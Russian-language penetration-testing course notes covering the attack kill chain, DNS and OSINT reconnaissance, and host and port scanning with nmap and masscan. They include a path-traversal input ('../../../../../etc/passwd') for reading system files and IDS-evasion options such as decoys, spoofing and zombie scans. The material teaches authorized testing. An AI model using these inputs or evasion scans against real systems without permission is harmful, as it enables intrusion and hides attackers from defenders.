В данном примере мы видим, что функция include подключает файлы из директории `/home/users/phpguru/templates/` , имена которых отправил пользователь в своих Cookie данных на сервер. В таком случае пользователь может изменить отправляемые им данные и добавить в данные отправляемые на сервер строку `../../../../../etc/passwd` .  В таком случае, сервер выполнит запрос к файлу по адресу `/home/users/phpguru/templates/../../../../../etc/passwd` , что, в конечном итоге, превратится в обращение к файлу /etc/passwd, и предоставит возможность чтения пользователю системных файлов ОС, к которым он не должен был иметь доступа.



Поиск доменных имен заключается в способах подбора, предугадывания а также сбора из открытых источников доменных имен организации и делится на **активный** и **пассивный** методы.

### **Методы активного поиска доменных имен и поддоменов**

Данный метод подразумевает активное взаимодействие с DNS-cервисом организации, т.е. выполнение запросов  непосредственно к инфраструктуре, принадлежащей, арендуемой или управляемой целевой организацией.

Получение информации о доменных именах и поддоменах от DNS-сервиса организации возможно следующими способами (не ограничиваясь ими):

**1. Опрашивание DNS сервиса** на известные ему записи раскрывающие доменные имена, связанные с доменом 2-го уровня. Т.е. выполнение запросов к таким DNS записям, как: CNAME, MX, NS, SRV и т.д. [Подробнее](https://ru.wikipedia.org/wiki/Типы_ресурсных_записей_DNS)

A – используется для указания доменного имени, например, testdomain.com, на IP-адрес его хост-сервера;  
MX – записи, отвечающие за обмен электронной почтой;  
NS – предназначены для идентификации DNS-серверов, ответственных за домен;  
SRV – записи для выделения службы, размещенной на определенных серверах;  
PTR – обратный поиск DNS: с помощью IP вы можете получить связанный с ним домен;  
SOA – начало записи: это информация о зоне DNS и других записях DNS;  
CNAME – сопоставляет целевое доменное имя с другим доменным именем.









Разведка во внешней инфраструктуре заказчика
**SSL (Secure Sockets Layer)** **сертификат** – это цифровой сертификат, который подтверждает подлинность веб-сайта и обеспечивает защищенное соединение между веб-браузером и сервером, на котором расположен веб-сайт. Сертификаты выпускаются специальными доверенными удостоверяющими центрами по всему миру, представляют из себя файлы определенного формата, которые располагаются на серверах, для предоставления их пользователям и проверки легитимности сервисов.

**Сетевой порт** – это номер, который идентифицирует определенный сетевой протокол и процесс, который использует этот протокол для передачи данных в компьютерных сетях. Когда компьютер или устройство отправляет или получает данные через сеть, он использует определенный порт для связи с другим устройством или сервером по определенному сетевому протоколу. Номер порта представляет собой целое число от 0 до 65535.

**Хост / узел** – это устройство или программа, которая может быть связана с другими устройствами или программами в компьютерной сети. Узлы сети могут выполнять различные функции, такие, как передача данных, маршрутизация, хранение информации, обработка запросов и т.д. Каждый узел сети имеет свой уникальный адрес, который позволяет другим узлам обращаться к нему и передавать данные. Примерами узлов сети могут быть компьютеры, маршрутизаторы, сетевые принтеры, серверы, мобильные устройства и т.д.

OSINT (Open Source Intelligence) — это методология сбора, анализа и использования открытой информации из различных источников для получения разведывательных данных или информации, полезной для принятия решений.
## Общие методы и конкретные способы сбора информации

Общие методы сбора информации разделяются на две категории: **активные** и **пассивные.**

**Активные методы сбора информации в OSINT** – это методы, которые требуют непосредственного взаимодействия с источником информации, например, с использованием запросов, сканирования портов и опроса сервисов.

Иначе говоря, непосредственный владелец ИТ-инфраструктуры сможет определить применение по отношению к нему активных методов сбора информации, т.к. его системы получат запросы от действующего лица и его программ. При активном методе ваши сетевые запросы приходят прямо от ваших систем на системы владельца, и он может их увидеть.

Примеры активных методов сбора информации включают:

1. Сканирование портов – это способ, который позволяет определить, какие порты на серверах компании открыты для доступа извне. Сканирование портов может помочь определить, какие службы доступны на серверах и какая операционная система установлена на серверах.
    
2. Энумерация и предугадывание доменных имен – это способы определения доменных имён, которые используются компанией или организацией. Этот процесс может включать в себя использование различных методов, таких, как перебор имен поддоменов, используемых в названии компании, и различных вариантов доменных зон (например, .com, .org, .net).
    
3. Посещение и анализ сайтов – это способы углубленного анализа сайтов на предмет их функций, используемых ими технологий, поиске отладочной и технической информации о внутренней сети или устройстве ПО организации.

**Пассивные методы сбора информации в OSINT** – это методы, которые не требуют непосредственного взаимодействия с источником информации.

Примеры пассивных методов сбора информации включают:

1. Поиск в сети Интернет – это процесс отслеживания и анализа информации, публикуемой в онлайн-ресурсах, включая репозитории, блоги, форумы и другие интернет-сайты, вакансии.
    
2. Анализ открытых баз данных – это процесс сбора информации из открытых баз данных, таких, как государственные реестры, базы данных компаний, справочники и т.д.
    
3. Анализ открытых источников информации – это процесс сбора и анализа информации, полученной из различных открытых источников, таких, как сайты-агрегаторы утечек данных, сайты, собирающие информацию о изменении DNS имен и историю DNS, сайты, исследующие интернет и опубликованные в нем сервисы.

Наши цели по исполнению этапа сбора информации:

4. Обнаружение доменных имен, принадлежащих организации
5. Обнаружение “живых” хостов в сети и составления списка их IP-адресов
6. Определение актуального статуса сетевых портов узлов из списка
7. Определение типа и версии операционной системы на исследованных машинах
8. Определение версий ПО или служб, которые находятся на сетевых портах
9. Сбор информации об используемых технологиях на веб-сайте




Сканирование узлов сети
Сканирование узлов сети работает, благодаря устройству таких протоколов, как: `ICMP`, `TCP`/`UDP` и `ARP`

- `ICMP` — это протокол сетевого уровня стека `TCP/IP`, предназначенный для передачи сервисных сообщений. Обычно используется для передачи сообщений об ошибках и других исключительных ситуациях, возникших при передаче данных, например, недоступность узла. `ICMP` включает в себя несколько типов сообщений, и в их числе _echo request_(8) и _echo response_(0), которые используются для проверки доступности: если узел получил эхо-запрос, он отправляет обратно эхо-ответ, что говорит об его доступности

Довольно часто `ICMP`-трафик в сети может быть заблокирован администраторами, поэтому обнаружить узлы обычным эхо-запросом не выйдет. В таком случае можно просто отправить `TCP` или UDP сообщение на какой-нибудь порт, и если ответ придет, делаем вывод, что узел под этим адресом существует в сети.

- `ARP` — это протокол канального уровня, позволяющий узнать MAC-адрес узла по его `IP` и наоборот. MAC-адрес, как и `IP,`может быть полезной информацией для исследователя, но он может быть получен таким образом в пределах одной локальной сети, так как ARP-запрос отправляется по broadcast MAC-адресу (`FF:FF:FF:FF:FF:FF`) и ограничивается одной подсетью.

## Алгоритм действий по сканированию узлов сети

На примере самого распространенного сканера сети Nmap рассмотрим, как можно **просканировать произвольное пространство сети.**

1. Определить адрес подсети, в которой будет производится поиск узлов. Например, `192.168.88.0/24`
2. Провести Ping-сканирование сети: `nmap -sn``--traceroute <network>`
    - `-sn` — ping-сканирование. По умолчанию посылаются запрос на `ICMP,`эхо-запрос и `TCP-ACK` пакет на порт 80.
    - `--traceroute` — также для того, чтобы проводить трассировку маршрута до каждого найденного узла. Эта опция может помочь в составлении карты подсети.
3. Если есть подозрение, что `ICMP`-пакеты и `TCP-ACK` сообщения блокируются сетевым экраном, можно применить другие виды сканирования:
    - `-PS` — `TCP-SYN` сканирование
    - `-PU` — `UDP` сканирование 
    - `-PE; -PP; -PM` — `ICMP`-сканирование других типов: запрос временной метки (13), информационный запрос (15), запрос адресной маски (17). Многие узлы и брандмауэры могут блокировать исключительно `ICMP`-пакеты типа `echo request`, но в спецификации `ICMP` присутствуют еще несколько типов запросов, позволяющих получить ответ от узлов.
4. Если после выполнения команд Nmap предоставил список доступных узлов, то сканирование может считаться успешным.

## Когда и как применять сканировании сети с целью обнаружения узлов?

Сканирование сети применяется на начальном этапе сбора информации для получения информации об используемых IP-адресах в сети. Сканирование применяют при отсутствии какой-либо информации о сети и инфраструктуре.

Эта техника дает информацию о доступных устройствах в сети. Однако она дает информацию только об их существовании и доступности, и не более того, в отличие от техники _сканирования портов_,  дополнительно дающей информацию об открытых портах и сервисах, запущенных на них.

Для применения этой техники,  как минимум, должен быть известен адрес целевой подсети. Все остальное выполняет сетевой сканер.

Сканирование сети — самый **быстрый** и **эффективный** способ обнаружение узлов в сети, однако это активный метод сбора информации, и использование этой техники несет за собой высокий риск обнаружения, так как большинство современных анализаторов трафика и `IDS/IPS-систем` умеют распознавать работу сетевого сканера, поэтому технику стоит использовать в случаях, когда **скрытность** не имеет особого значения для хакера.

## Эффективность техники сканирования узлов сети

Эффективность техники измеряется в ее:

- Скорости
- Скрытности
- Качестве результатов

### Как повысить эффективность техники

Повысить **скорость** сканирования на примере сканера Nmap можно:

1. Указав опцию `-sn`, говорящей nmap не делать сканирование портов после обнаружения узла. Таким образом, время не будет тратиться на сканирование множества портов, которые nmap сканирует по умолчанию и будет происходить только обнаружение узлов

2. Указав опцию `-n`, отключающей разрешение DNS-имен. По умолчанию при обнаружении узлов nmap также производит обратное DNS разрешение, для того, чтобы по найденным ip-адресам попробовать узнать их доменные имена. Это не всегда требуется, и отключение разрешения имен может ускорить процесс сканирования

3. Используя опции таймингов `-T3, -T4, -T5, и т.д.`, которые изменяют интервал между сетевыми запросами (чем выше число, тем меньше интервалы между запросами и тем быстрее выполнится скан) Возможные варианты: paranoid(0), sneaky(1), polite(2), normal(3), aggressive(4) и insane(5). Первые два помогают уклоняться от идентификации атакующего. 2-й режим замедляет сканирование, 3-й режим по умолчанию (то есть никакой оптимизации не будет по данному ключу), 4-й режим ускоряет сканирование, 5-й режим очень быстро сканирует, но есть вероятность в потере точности при сканировании. Пример: `nmap -Т4 <example.com>`.

**Скрытность** на примере сканера Nmap может быть повышена, если:

1. Использовать опцию `--data-length <length>`, добавляющей случайных байтов информации к каждому пакету, что помогает сделать сканирование менее заметным и более похожим на пакеты, генерируемые программой ping.

2. Добавить опцию `--randomize-hosts`, перемешивающую сканирование узлов, чтобы сделать сканирование менее подозрительным при анализе трафика

**Качество** результатов:

Повышается за счет использования разных видов сканирования, основанных на разных протоколах. Таким образом, если некоторые протоколы фильтруются брандмауэром, результат можно получить, используя другие протоколы. Например, довольно часто системными администраторами блокируется трафик `ICMP`, в таком случае можно попробовать `TCP/UDP` сканирование.

**Комбинации**

Для наиболее сложных задач сканирования (например, при больших количествах) можно пользоваться комбинированием алгоритмов и инструментов. Например, если целевая сеть большая и может содержать несколько подсетей, можно быстро прогнать masscan по всей сети, чтобы определить подсети в ней, а затем, уже по найденным подсетям меньшего размера, идти nmap-ом.

Пример использования masscan:

```nginx
masscan 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12 -p80 --open-only
```

Здесь идет сканирование трех больших сетей `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12` по 80 порту.

Для повышения скрытности можно реализовать возможность использования фиктивных `хостов` (decoys) с опцией `-D` для того, чтобы скрыть IP-адрес атакующего от `IDS/IPS систем.`







Этапы проведения атак и компрометации информационных систем
- **Reconnaissance (англ. Разведка)** — это процесс сбора информации об инфраструктуре и уязвимостях компании, который выполняют, чтобы определить, какие действия могут быть выполнены для ее компрометации.
    
- **Weaponization (англ. Вооружение)** — это процесс создания и подготовки действующим лицом программного обеспечения и инструментов, которое может использоваться для атаки на инфраструктуру компании.
    
- **Delivery (англ. Доставка)** — это процесс доставки программного обеспечения на устройства в сети компании.
    
- **Exploitation (англ. Эксплуатация)** — это процесс использования уязвимостей в инфраструктуре компании, обнаруженных на этапе разведки, для получения несанкционированного доступа.
    
- **Installation (англ. Установка)** — это процесс установки вредоносного программного обеспечения на компьютеры или серверы в сети компании для закрепления полученного доступа в системе.
    
- **Command and control (англ. Командование и контроль)** — это процесс установки соединения между скомпрометированным компьютером и управляющим им ПО, и сервером действующего лица, который дает лицу возможность удаленно управлять компьютером.
    
- **Actions on objective (англ. Действия по достижению цели)** — это процесс выполнения действующим лицом своих целей, которые могут включать выполнение таких недопустимых для организации событий как: кражу данных, шпионаж, вредоносные действия и другие действия, которые могут нанести ущерб инфраструктуре компании.

### **Этапы, которые проходит хакер для достижения цели:**

- Разведка во внешней сети
- Атаки первичного доступа
- Закрепление доступа  
- Повышение привилегий
- Выход за рамки демилитаризованной зоны (ДМЗ) и ограничений сети
- Проброс трафика в другие сегменты
- Разведка в локальной сети
- Захват управления инфраструктурой сети
- Противодействие обнаружению и реагированию

## **Типовая инфраструктура компании**

- **Internal network** (англ. Внутренняя сеть) – это часть инфраструктуры полностью подконтрольной организации, зачастую принадлежащей или арендуемой организацией для ведения деятельности.
- **DMZ** (англ. Demilitarized Zone) — это сегмент сети, расположенный между внешней и внутренней сетью, где находятся ресурсы, которые доступны из Интернета, например, веб-серверы или почтовые серверы, но из которых нельзя получить доступ во внутреннюю сеть.
- **User VLAN** (англ. Virtual Local Area Network) — это логический сегмент сети, в котором находятся пользовательские устройства, такие как стационарные компьютеры, ноутбуки и телефоны.
- **Server VLAN** (англ. Virtual Local Area Network) — это логический сегмент сети, в котором находятся серверы, используемые в организации, например, файловые серверы или базы данных.
- **APM** (Автоматизированное рабочее место) — это рабочее место (компьютер) пользователя/сотрудника сети организации.
- **RDP** (англ. Remote Desktop Protocol) — это протокол удаленного доступа к рабочему столу операционной системы Windows и соответствующий этому протоколу сервис.
- **DC** (англ. Domain Controller) — это сервер, который выполняет функции управления учетными записями пользователей и компьютеров в доменной среде Windows.
- **FTP** (англ. File Transfer Protocol) — это протокол передачи файлов, который позволяет перемещать файлы между компьютерами в сети и соответствующий этому протоколу сервис.
- **Terminal** — это устройство, которое предоставляет доступ к удаленному серверу или виртуальной машине, позволяя пользователю работать с приложениями и данными, находящимися на удаленном сервере.
- **DNS** (англ. Domain Name System) — это система, которая преобразует доменные имена в IP-адреса и обратно, обеспечивая идентификацию устройств в сети и соответствующий этой системе сервис. 
- **Secure server** — это сервер, настроенный с дополнительными мерами безопасности, которые обеспечивают защиту данных и приложений на сервере от несанкционированного доступа и других угроз.




Cканирование портов

Данная техника строится на особенностях реализации протоколов транспортного уровня, где происходит распределение трафика между приложениями системы за счёт перенаправления его на сетевые порты.

> Сетевой порт представляет собой число от 1 до 65535, указанное и известное обоим приложениям, между которыми устанавливается связь.

На данном уровне два самых популярных протокола `TCP` и `UDP`. На основе их поведения в сети наши инструменты могут делать выводы о том, есть ли возможность взаимодействия с портом или нет, **т.е. сообщать нам о том, открыт порт или закрыт.**

Исследуем поведение этих двух популярных протоколов, чтобы понимать, как сканер определяет их открытость.

**Протокол TCP**

При использовании протокола `TCP` образуется соединение, которое гарантирует _**доставку**_ тех или иных сетевых пакетов, и происходит контролирование порядка следования сетевых пакетов. Это происходит через механизм трехэтапного рукопожатия:

1. Клиент отправляет сетевой пакет с установленным флагом `SYN`. При этом пакету присваивается произвольный порядковый номер (sequence number) в интервале от 1 до 232 (т.н. initial sequence number), относительно которого будет вестись дальнейший отсчет последовательности пакетов в соединении.

2. Сервер получает запрос и отправляет ответный пакет с одновременно установленными флагами `SYN+ACK`, при этом записывает в поле «номер подтверждения» (acknowledgement number), полученный порядковый номер, увеличенный на 1 (что подтверждает получение первого пакета), а также устанавливает свой порядковый номер, который, как и в `SYN`-пакете, выбирается произвольно.

3. После получения клиентом пакета с флагами `SYN+ACK` соединение считается установленным, клиент, в свою очередь, отправляет в ответ пакет с флагом `ACK`, обновленными номерами последовательности и не содержащий полезной нагрузки.

Если сервис на открытом сетевом порту начинает обмениваться с нами вторым шагом трех-этапного рукопожатия, то он существует и доступен для взаимодействия. И наоборот, если сервис не отвечает нам или возвращает пакет, отличный от пакета с флагами `SYN+ACK`, то порт фильтруется или закрыт.

**Протокол UDP**

При использовании протокола`UDP` сетевой пакет просто отправляется по сети до указанного узла на указанный порт, при этом нет гарантии, что пакет дойдёт до адресата, также никак не контролируется порядок следования пакетов. Однако при использовании этого протокола пакет если и достигает адресата, то это происходит намного быстрее, чем при `TCP`.

Открытость или закрытость данного порта определяется с помощью `ICMP` ответов на отправленные `UDP` пакеты. Если порт не активен, то удаленный узел отправляет нам ответ по протоколу `ICMP`: port-unreachable.

> Данный метод не эффективен, если происходит фильтрация `ICMP` пакетов с помощью `FireWall`.

## Статусы открытости портов

Важно понимать, что любые инструменты будут описывать сетевые порты определенными статусами. В соответствии с утилитой Nmap существует шесть состояний сетевых портов :

- открыт (open):

Приложение принимает запросы на `TCP` соединение или `UDP` пакеты на этот порт. Обнаружение этого состояния обычно является основной целью сканирования. Люди, разбирающиеся в безопасности, знают, что каждый открытый порт — это прямой путь к возможному взаимодействию. Атакующие хотят использовать открытые порты, а администраторы пытаются закрыть их или защитить с помощью брандмауэров так, чтобы не мешать работе обычных пользователей. Открытые порты также интересны с точки зрения сканирования, не связанного с безопасностью, так как они позволяют определить службы, доступные в сети.

- закрыт (closed):

Закрытый порт доступен, но не используется каким-либо приложением. Этот статус может означать, что по заданному `IP` адресу есть существующий узел. Так как эти порты достижимы, может быть полезным произвести сканирование позже, так как некоторые из них могут открыться. Администраторы могут заблокировать такие порты с помощью брандмауэров, тогда их состояние будет определено как "фильтруется".

- фильтруется (filtered):

Нельзя определить, открыт ли порт, так как фильтрация пакетов не позволяет достичь запросам Nmap этого порта. Фильтрация может осуществляться выделенным брандмауэром, правилами роутера или брандмауэром на целевой машине. Эти порты бесполезны для атакующих, так как предоставляют очень мало информации. Иногда они отвечают`ICMP`сообщениями об ошибке, такими, как _тип 3 код 13_ (destination unreachable: communication administratively prohibited (англ.: цель назначения недоступна: связь запрещена администратором), но чаще встречаются фильтры, которые отбрасывают запросы без предоставления какой-либо информации. Для этого нужно сделать еще несколько запросов, чтобы убедиться, что запрос был отброшен фильтром, а не затором в сети. Это очень сильно замедляет сканирование.

- не фильтруется (unfiltered):

Это состояние означает, что порт доступен, но нельзя определить, открыт он или закрыт. Только ACK сканирование, используемое для определения правил брандмауэра, может охарактеризовать порт этим состоянием. Сканирование не фильтруемых портов другими способами, такими, как Windows сканирование, SYN сканирование или FIN сканирование, может помочь определить, является ли порт открытым.

- открыт|фильтруется (open|filtered):

Порт характеризуется таким состоянием, когда нельзя определить, открыт порт или фильтруется. Это состояние возникает при таких типах сканирования, при которых открытые порты не отвечают. Отсутствие ответа также может означать, что пакетный фильтр не пропустил запрос или ответ не был получен. Порт может быть охарактеризован таким состоянием при сканировании `UDP`, по `IP` протоколу, FIN, NULL, а также Xmas.

- закрыт|фильтруется (closed|filtered):

Это состояние используется, когда нельзя определить, закрыт порт или фильтруется. Используется только при сканировании `IP ID` idle типа.

## Алгоритм сканирования портов

**Последовательность шагов**

1. Для начала мы должны знать `IP` адрес сетевого узла, который мы хотим просканировать. При этом данный сетевой узел должен в сети быть физически доступен нам.

2. Мы должны определиться, какие порты какого протокола сканируем: `TCP` или `UDP`. Nmap по умолчанию сканирует `TCP` порты. Если нам нужно сканировать `UDP` порты, то следует использовать ключ `-sU`.

3. Если мы выбрали сканировать `TCP` порты, то мы должны определиться, какую методику сканирования выберем:

- `TCP-SYN` сканирование (`-sS`) - сканирование, при котором устанавливается неполное `TCP` соединение. Из плюсов: данный метод позволяет быстро сканировать порты и при этом оставаться относительно скрытным из-за самой особенности неполного установления соединения. Из минусов: данный тип сканирования не гарантирует достоверность информации о соединении портов, так как соединение не устанавливается полноценно и на деле сетевой порт может блокировать установленное соединение. Данный метод сканирование используется nmap по умолчанию, если оно запускается с правами суперпользователя или администратора.
- Полное `TCP` сканирование с использованием системного вызова connect (`-sT`): сканирование, при котором устанавливается полноценное `TCP` соединение по указанному порту с помощью системного вызова connect. Из плюсов: данный тип сканирования даёт достоверную информацию о состоянии сетевых портов за счёт установленного полноценного соединения. Из минусов: данный метод сканирования медленный, что ощутимо при сканировании большого количества сетевых портов. Данный метод сканирования используется nmap по умолчанию, если оно запускается с правами обычного пользователя.

4. Проведём само сканирование следующими командами:

- `nmap -sS <example.com>` – `TCP-SYN` сканирование узла
- `nmap -sT <example.com>` – полное `TCP` сканирование узла
- `nmap -sU <example.com>` – `UDP` сканирование узла

## Эффективность техники сканирования портов

Эффективность техники измеряется в ее:

- Скорости
- Скрытности
- Качестве результатов

### Как повысить эффективность техники

1. Для оптимизации **скорости** сканирования — можно использовать шаблоны управления временем с помощью ключа `-Т`. Возможные варианты: paranoid(0), sneaky(1), polite(2), normal(3), aggressive(4) и insane(5).

Мы рассказывали об этом в предыдущих шагах.

> Пример: `nmap -Т4 <example.com>`.

Также возможна ситуация, когда нужно получить быстрый и максимально информативный результат сканирования сетевых портов. Для этого можно использовать ключ `--top-ports <количество_портов>`. Данный ключ сканирует заданное количество портов по рейтингу их популярности. Так же можно использовать ключ `-F`, который позволяет использовать сетевые пакеты минимального объёма. Ещё возможна ситуация, когда нас интересует лишь конкретные порты узла. Для этого можно использовать ключ `-p <номер_порта>`.

_**Список популярных сетевых портов**_

На сетевых периметрах часто встречаются `UDP-сервисы` `DNS` (53), `NTP` (123), `SNMP` (161), `VPN` (500, 1194, 4500), `RDG` (3391). Реже встречаются `сервисные службы` типа `echo` (7), `discard` (9), `chargen` (19), а также `DAYTIME` (13), `TFTP` (69), `SIP` (5060), `сервисы NFS` (2049), `RPC` (111, 137-139, 761 и др.), `СУБД` (1434).

_Расширенный список:_

- 21 — ftp
- 22 — ssh
- 23 — telnet
- 80, 8000, 8001, 8002, 8004, 8006, 8007, 8008, 8080, 8888 — http
- 88 — kerberos
- 139 — netbios
- 143 — imap
- 389 — ldap
- 443, 8443, 9443 — https
- 445 — smb
- 623, 49152 — ipmi
- 636 — ldaps
- 873 — rsync
- 1099 — websphere
- 1433, 1434 — mssql
- 1500 — tivoli_storage_manager
- 1540, 1541 — 1С
- 2001, 2010 — ibm_http
- 2181 — zookeeper
- 2222 — ansible
- 2375, 2376 — docker
- 2379 — k8s etcd
- 2809, 9043, 9060, 9080, 9501, 9502, 9503 — websphere
- 5558, 5559 — websphere_java_messaging_service
- 7873 — websphere_rds_client
- 8879 — websphere_soap
- 3306 — mysql
- 3389 — rdp
- 4678 — cisco smart install
- 4899 — radmin
- 5800 — 5810,5900,5901 — vnc
- 5432, 5433 — postgresql
- 5555 — hp_data_protector
- 5557 — citrix
- 5666 — nagious
- 8291 — mikrotik
- 10050, 10051 — zabbix
- 7001 — weblogic
- 9000 — clickhouse
- 27017, 27018 — mongodb
- 50013 — sap
- 1521 — 1527 — oracle
- 3200 — 3299 — sap
- 4786 — cisco_smart_install
- 9200, 9300 — elasticsearch
- 5985, 5986 — winrm
- 50070 — hdfs_ui
- 6443 — k8s
- 8111 — click_house
- 8500, 8501 — consul
- 8200, 8201 — vault
- 10250, 10255 — k8s

Увеличению скорости сканирования способствует флаг `-n`, который говорит, что не надо преобразовывать адреса обнаруженных узлов в `DNS` - адреса.

2. Для лучшей **скрытности** сканирования — в локальных сетях можно использовать ключ `-spoof-mac` для изменения `MAC` адреса атакующего узла и флаг `-S` для изменения его `IP` адреса.

3. **Качество результатов**

- Если стоит задача проверить все возможные номера сетевых `портов`, то следует использовать ключ `-p-`.
- Если очень много информации о результате сканирования, то для удобства изучения можно перенаправить вывод информации в текстовый файл с помощью ключа `-oN <имя_файла>` 
- Если есть список `IP адресов`, которые подлежат проверке состояния их сетевых портов, то можно использовать ключ `-iL <имя_файла>`, где в качестве имени файла передаётся файл с нужными `IP` адресами.

4. **Комбинации** 

Улучшить технику сканирования можно за счёт использования сильных сторон тех или иных инструментов и комбинирования их между собой.

> Пример: nmap сканирует сетевые порты довольно медленно, но качественно, с помощью этого инструмента можно уточнять состояния портов. Но перед этим можно просканировать узел или узлы с помощью намного более быстрого инструмента — masscan и после этого лишь уточнить достоверность его результатов сканирования с помощью nmap.

У nmap есть свой набор скриптов, которые способны дать определённую информацию при сканировании. Они делятся на следующие типы: safe, (intrusive), malware, version, discovery, vuln, auth и default. Что бы при сканировании работал какой — то конкретный скрипт или группа скриптов, то следует запускать с ключом —script.

> Пример: `sudo nmap --script <категории - скриптов>|<директория>|<имя_файла>|all <example.com>.`

Также, возможно, некоторым `скриптам` нужно передавать значения. Это делается следующим образом: `—script-args <имя1>=<значение1>, <имя2>={<имя3>=<значение3>}, <имя4>=<значение4>`. Данные `скрипты` позволяют выполнять параллельные действия над сканируемыми сетевыми `портами`.  
  
Также для улучшения техники сканирования можно комбинировать различные ключи, которые позволяют эффективнее исследовать большую совокупность узлов за один раз:

- Ключ `-sV` позволяет узнать версию используемых служб.
- Ключ `-sL` позволяет определить имя сетевого узла, сканирование которого и происходит.
- Ключ `-v` выводит подробную информацию о результатах сканирования. Есть еще `-vv` и `-vvv`
- Ключ `-6` позволит использовать при сканировании IPv6 вместо IPv4.
- Ключ `-Pn` позволяет отключить проверки доступности узла с помощью`ICMP`пакетов, так как некоторые `FireWall` настроены на откидывание данных пакетов, в следствии чего не удастся просканировать узел. Однако данный ключ замедляет сканирование системы.

Также можно использовать нестандартные методики сканирования для улучшения результата, например, сканирование с помощью кастомизации флагов. Данный тип сканирования родился из особенностей реализации протоколов по соглашению RFC. Суть метода в том, что открытие/закрытие порта можно выявить с помощью особенности: любой пакет, не содержащий установленного бита SYN, RST или ACK, повлечет за собой отправку RST в ответ в случае, если порт закрыт, или не повлечет никакого ответа, если порт открыт. Если ни один из этих битов не установлен, то любая комбинация трех оставшихся (FIN, PSH и URG) будет являться правильной. В nmap для этого используются следующие ключи:

- Null сканирование (`-sN`): не устанавливаются никакие биты (Флагов в `TCP` заголовке 0).
- FIN сканирование (`-sF`): устанавливается только `TCP` FIN бит.
- Xmas сканирование (`-sX`): устанавливаются FIN, PSH и URG флаги.
- `TCP` ACK сканирование (`-sA`): данный тип сканирование направлен на изучение особенностей реагирования `Firewall`. Если `порт не` фильтруется, то будет возвращаться `TCP` ответ с флагом RST.
- `TCP` Window сканирование (`-sW`): данный тип сканирование похож сутью работы на `TCP` ACK, но при этом способен определять, закрыт или открыт порт за счёт анализа поля `TCP` Window в RST ответе. В некоторых системах открытые `порты` используют положительное значение этого поля (даже в RST пакетах), а закрытые — нулевое.
- `TCP` сканирование Мэймона (`-sM`): этот тип сканирования носит имя своего первооткрывателя, Уриела Мэймона. Техника практически такая же, как и при NULL, FIN и Xmas сканированиях, только в качестве запросов используются запросы FIN/ACK. Согласно RFC 793 (`TCP`), в ответ на такой запрос должен быть сгенерирован RST пакет, если порт открыт или закрыт. Однако многие BSD системы просто отбрасывают пакет, если порт открыт.
- Зомби сканирование (`-sI`): данный метод сканирование позволяет полностью анонимно просканировать узел на информацию о состояние портов, так как сканирование происходит от лица другого узла.
- FTP bounce сканирование (-b): данный метод сканирования основан на возможности одного FTP сервера обмениваться файлами с другим FTP сервером. Этот метод позволяет достигнуть анонимности, но сейчас крайне мало шансов, что он сработает, так как многие FTP сервера переконфигурированы так, что они не могут отправлять между собой файлы.

5. **Дополнительные материалы**

Ссылка на официальную документацию: [https://nmap.org/man/ru/](https://nmap.org/man/ru/)





